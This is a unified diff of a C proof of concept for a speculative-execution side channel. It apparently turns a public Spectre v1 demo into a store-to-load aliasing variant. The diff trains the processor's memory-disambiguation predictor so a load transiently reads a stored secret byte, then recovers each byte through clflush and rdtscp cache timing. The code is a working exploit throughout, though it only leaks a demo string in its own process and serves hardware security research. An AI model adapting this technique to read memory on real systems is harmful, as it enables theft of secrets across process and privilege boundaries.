@@ -1,13 +1,7 @@
 /*********************************************************************
 *
-* Spectre PoC
-*
-* This source code originates from the example code provided in the 
-* "Spectre Attacks: Exploiting Speculative Execution" paper found at
-* https://spectreattack.com/spectre.pdf
-*
-* Minor modifications have been made to fix compilation errors and
-* improve documentation where possible.
+* This source code is based off the Spectre v1 PoC
+* found at https://github.com/crozone/SpectrePoC.git
 *
 **********************************************************************/
 
@@ -16,36 +10,13 @@
 #include <stdlib.h>
 #include <stdint.h>
 
+#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
+
+#include <unistd.h>
 #include <sys/mman.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
-
-#ifdef _MSC_VER
-#include <intrin.h> /* for rdtsc, rdtscp, clflush */
-#pragma optimize("gt",on)
-#else
-#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
-#endif /* ifdef _MSC_VER */
-
-/* Automatically detect if SSE2 is not available when SSE is advertized */
-#ifdef _MSC_VER
-/* MSC */
-#if _M_IX86_FP==1
-#define NOSSE2
-#endif
-#else
-/* Not MSC */
-#if defined(__SSE__) && !defined(__SSE2__)
-#define NOSSE2
-#endif
-#endif /* ifdef _MSC_VER */
-
-#ifdef NOSSE2
-#define NORDTSCP
-#define NOMFENCE
-#define NOCLFLUSH
-#endif
 
 /********************************************************************
 Victim code.
@@ -74,11 +45,10 @@ uint8_t unused2[64];
 uint8_t array2[256 * 512];
 int32_t big_block[4096];
 #define NUM_PAGES 1024
-volatile int32_t* load_addr[NUM_PAGES];
+volatile int32_t* load_addrs[NUM_PAGES];
 #define NUM_BAGS (4096/(sizeof(int32_t)))
-volatile int32_t dropbags[NUM_BAGS];
+volatile int32_t store_addrs[NUM_BAGS];
 
-char * secret_string       = "The Magic Words are Squeamish Ossifrage.";
 const uint32_t secret[]     =
 {'T',
   'h',
@@ -121,37 +91,17 @@ const uint32_t secret[]     =
   'e',
   '.',
 };
-char   best_guess[] = "                                        ";
-char   second_guess[]="                                        ";
 
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
-#ifdef LINUX_KERNEL_MITIGATION
-/* From https://github.com/torvalds/linux/blob/cb6416592bc2a8b731dabcec0d63cda270764fc6/arch/x86/include/asm/barrier.h#L27 */
-/**
- * array_index_mask_nospec() - generate a mask that is ~0UL when the
- * 	bounds check succeeds and 0 otherwise
- * @index: array element index
- * @size: number of elements in array
- *
- * Returns:
- *     0 - (index < size)
- */
-static inline unsigned long array_index_mask_nospec(unsigned long index,
-		unsigned long size)
-{
-	unsigned long mask;
 
-	__asm__ __volatile__ ("cmp %1,%2; sbb %0,%0;"
-			:"=r" (mask)
-			:"g"(size),"r" (index)
-			:"cc");
-	return mask;
-}
-#endif
-
-void victim_function(size_t x, register volatile int32_t* dropbag, register volatile int32_t* load_addr) {
-  *dropbag = array1[x]+1;
+/* By training the aliasing detection, we can cause *load_addr to load the
+ * value stored at *store_addr even when store_addr != load_addr. We abuse this
+ * to read and leak values of secret[] through *load_addr, despite *load_addr
+ * never actually containing these values. */
+void victim_function(size_t x, register volatile int32_t* store_addr, register volatile int32_t* load_addr) {
+  *store_addr = array1[x]+1;
+  // placing an lfence here after the store prevents the vulnerability
   temp &= array2[(*(load_addr)-1) * 512];
 }
 
@@ -159,84 +109,46 @@ void victim_function(size_t x, register volatile int32_t* dropbag, register vola
 /********************************************************************
 Analysis code
 ********************************************************************/
-#ifdef NOCLFLUSH
-#define CACHE_FLUSH_ITERATIONS 2048
-#define CACHE_FLUSH_STRIDE 4096
-uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];
 
-/* Flush memory using long SSE instructions */
-void flush_memory_sse(uint8_t * addr)
-{
-  float * p = (float *)addr;
-  float c = 0.f;
-  __m128 i = _mm_setr_ps(c, c, c, c);
-
-  int k, l;
-  /* Non-sequential memory addressing by looping through k by l */
-  for (k = 0; k < 4; k++)
-    for (l = 0; l < 4; l++)
-      _mm_stream_ps(&p[(l * 4 + k) * 4], i);
-}
-#endif
-
-/* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2],
-    int results[256], int pagenum, int dropnum) {
+/* Find accessed cache lines corresponding to ASCII values */
+void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int results[256], int pagenum, int dropnum) {
   int tries, i, j, k, mix_i;
   unsigned int junk = 0;
   size_t training_x, x;
   register uint64_t time1, time2;
   volatile uint8_t * addr;
 
-#ifdef NOCLFLUSH
-  int junk2 = 0;
-  int l;
-  (void)junk2;
-#endif
-
   for (i = 0; i < 256; i++)
     results[i] = 0;
   for (tries = 1999; tries > 0; tries--) {
 
-#ifndef NOCLFLUSH
     /* Flush array2[256*(0..255)] from cache */
     for (i = 0; i < 256; i++)
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
-#else
-    /* Flush array2[256*(0..255)] from cache
-       using long SSE instruction several times */
-    for (j = 0; j < 16; j++)
-      for (i = 0; i < 256; i++)
-        flush_memory_sse( & array2[i * 512]);
-#endif
 
     training_x = tries % array1_size;
-    // training_x = 0;
-    uint64_t training_alias = (uint64_t)&dropbags[dropnum];
-    // training_alias = (uint64_t)load_addr[pagenum+1];
-    uint64_t malicious_alias = (uint64_t)load_addr[pagenum];
-    int32_t* alias_p = malicious_alias;
+    uint64_t training_alias = (uint64_t)&store_addrs[dropnum];
+    uint64_t malicious_alias = (uint64_t)load_addrs[pagenum];
+    int32_t* alias_p;
     for (int k = 0; k < 500; k++) {
       for (j = 25-1; j >= 0; j--) {
-        // uint64_t training_alias = (uint64_t)&dropbags[k % NUM_BAGS];
         /* Bit twiddling to set x=training_x if j%25!=0 or malicious_x if j%25==0 */
         /* Avoid jumps in case those tip off the branch predictor */
-        x = (j - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-        x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
-        alias_p = training_alias ^ (x & (malicious_alias ^ training_alias));
+        x = (j - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%25==0, else x=0 */
+        x = (x | (x >> 16)); /* Set x=-1 if j&25=0, else x=0 */
+        // set alias_p to truly alias the store_addr if j%25!=0,
+        // and NOT alias the store_addr if j%25==0
+        alias_p = (int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias)));
         x = training_x ^ (x & (malicious_x ^ training_x));
 
-        /* printf("\nj: %d  x: %08x\n", j, x); */
-        /* printf("   alias: %016p\n", alias_p); */
+        _mm_clflush( (int32_t*)malicious_alias);
 
-        _mm_clflush( malicious_alias);
-
-        /* Delay (can also mfence) */
+        /* Delay */
         for (volatile int z = 0; z < 400; z++) {}
         _mm_lfence();
 
         /* Call the victim! */
-        victim_function(x, &dropbags[dropnum], alias_p);
+        victim_function(x, &store_addrs[dropnum], alias_p);
 
       }
     }
@@ -254,63 +166,15 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     processor ticks, and is also serialized.
     */
 
-#ifndef NORDTSCP
       time1 = __rdtscp( & junk); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-#else
 
-    /*
-    The rdtscp instruction was instroduced with the x86-64 extensions.
-    Many older 32-bit processors won't support this, so we need to use
-    the equivalent but non-serialized tdtsc instruction instead.
-    */
-
-#ifndef NOMFENCE
-      /*
-      Since the rdstc instruction isn't serialized, newer processors will try to
-      reorder it, ruining its value as a timing mechanism.
-      To get around this, we use the mfence instruction to introduce a memory
-      barrier and force serialization. mfence is used because it is portable across
-      Intel and AMD.
-      */
-
-      _mm_mfence();
-      time1 = __rdtsc(); /* READ TIMER */
-      _mm_mfence();
-      junk = * addr; /* MEMORY ACCESS TO TIME */
-      _mm_mfence();
-      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-      _mm_mfence();
-#else
-      /*
-      The mfence instruction was introduced with the SSE2 instruction set, so
-      we have to ifdef it out on pre-SSE2 processors.
-      Luckily, these older processors don't seem to reorder the rdtsc instruction,
-      so not having mfence on older processors is less of an issue.
-      */
-
-      time1 = __rdtsc(); /* READ TIMER */
-      junk = * addr; /* MEMORY ACCESS TO TIME */
-      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-#endif
-#endif
       if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
 
-    /* Locate highest & second-highest results results tallies in j/k */
-    j = k = -1;
-    for (i = 0; i < 256; i++) {
-      if (j < 0 || results[i] >= results[j]) {
-        k = j;
-        j = i;
-      } else if (k < 0 || results[i] >= results[k]) {
-        k = i;
-      }
-    }
-    //if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
-    //  break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+    /* Detect cache lines */
   }
   printf(">");
   for (i = 32; i < 128; i++) { // printable range
@@ -325,10 +189,6 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     }
   }
   results[0] ^= junk; /* use junk so code above won’t get optimized out*/
-  value[0] = (uint8_t) j;
-  score[0] = results[j];
-  value[1] = (uint8_t) k;
-  score[1] = results[k];
 }
 
 /*
@@ -349,8 +209,6 @@ int main(int argc,
   /* Default addresses to read is 40 (which is the length of the secret string) */
   int len = 40;
   
-  int score[2];
-  uint8_t value[2];
   int i;
 
   #ifdef NOCLFLUSH
@@ -367,27 +225,27 @@ int main(int argc,
   ftruncate(fd, 0x1000 * NUM_PAGES);
   int32_t* mmap_base = mmap(NULL, 0x1000 * NUM_PAGES, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 
-  // arbitrary
+  // arbitrarily chosen
   int dropnum = 33;
 
   uint64_t alias_base = (uint64_t)mmap_base;
   // touch all the pages
   for (i = 0; i < NUM_PAGES; i++) {
-    load_addr[i] = (int32_t*)((((uint64_t)&dropbags[dropnum]) & 0xfff) + (alias_base + i * 0x1000));
-    *(load_addr[i]) = 0xDD;
+    load_addrs[i] = (int32_t*)((((uint64_t)&store_addrs[dropnum]) & 0xfff) + (alias_base + i * 0x1000));
+    *(load_addrs[i]) = 0xDD;
   }
 
-  // always use the 4th page (arbitrarily chosen)
+  // arbitrarily chosen
   int pagenum = 4;
 
   // offset so lower bits don't match
-  load_addr[pagenum] = (int32_t*)(((uint64_t)load_addr[pagenum]) + 37);
+  load_addrs[pagenum] = (int32_t*)(((uint64_t)load_addrs[pagenum]) + 37);
 
-  printf("  dropbag: %p\nload_addr: %p\n     mmap: %p\n     diff: 0x%012x\n", &dropbags[dropnum], load_addr[4], mmap_base, (uint64_t)load_addr[pagenum] - (uint64_t)mmap_base);
+  printf("store_addr: %p\n load_addr: %p\n      mmap: %p\n      diff: 0x%012lx\n", &store_addrs[dropnum], load_addrs[pagenum], mmap_base, (uint64_t)load_addrs[pagenum] - (uint64_t)mmap_base);
   printf("&array1_size: %p\n", &array1_size);
 
   // touch the chosen page again just to be sure
-  *(load_addr[pagenum]) = 0xCC;
+  *(load_addrs[pagenum]) = 0xCC;
 
   for (i = 0; i < (int)sizeof(array2); i++) {
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
@@ -399,17 +257,6 @@ int main(int argc,
     sscanf(argv[1], "%d", &cache_hit_threshold);
   }
 
-  /* Parse the malicious x address and length from the second and third
-     command line argument. (OPTIONAL) */
-  if (argc >= 4) {
-    sscanf(argv[2], "%p", (void * * )( &malicious_x));
-
-    /* Convert input value into a pointer */
-    malicious_x -= (size_t) array1;
-
-    sscanf(argv[3], "%d", &len);
-  }
-
   /* Print git commit hash */
   #ifdef GIT_COMMIT_HASH
     printf("Version: commit " GIT_COMMIT_HASH "\n");
@@ -417,34 +264,6 @@ int main(int argc,
   
   /* Print cache hit threshold */
   printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);
-  
-  /* Print build configuration */
-  printf("Build: ");
-  #ifndef NORDTSCP
-    printf("RDTSCP_SUPPORTED ");
-  #else
-    printf("RDTSCP_NOT_SUPPORTED ");
-  #endif
-  #ifndef NOMFENCE
-    printf("MFENCE_SUPPORTED ");
-  #else
-    printf("MFENCE_NOT_SUPPORTED ");
-  #endif
-  #ifndef NOCLFLUSH
-    printf("CLFLUSH_SUPPORTED ");
-  #else
-    printf("CLFLUSH_NOT_SUPPORTED ");
-  #endif
-  #ifdef INTEL_MITIGATION
-    printf("INTEL_MITIGATION_ENABLED ");
-  #else
-    printf("INTEL_MITIGATION_DISABLED ");
-  #endif
-  #ifdef LINUX_KERNEL_MITIGATION
-    printf("LINUX_KERNEL_MITIGATION_ENABLED ");
-  #else
-    printf("LINUX_KERNEL_MITIGATION_DISABLED ");
-  #endif
 
   printf("\n");
 
@@ -458,10 +277,12 @@ int main(int argc,
     printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
 
     /* Call readMemoryByte with the required cache hit threshold and
-       malicious x address. value and score are arrays that are
-       populated with the results.
+         malicious x address.
+       Output is of the form xx/nnnn, where xx is the cached index and nnnn is
+         the number of detected hits.
+       Any detected ASCII characters are printed between the >< arrows.
     */
-    readMemoryByte(cache_hit_threshold, malicious_x++, value, score, results, pagenum, dropnum);
+    readMemoryByte(cache_hit_threshold, malicious_x++, results, pagenum, dropnum);
 
     i++;
     printf("\n");
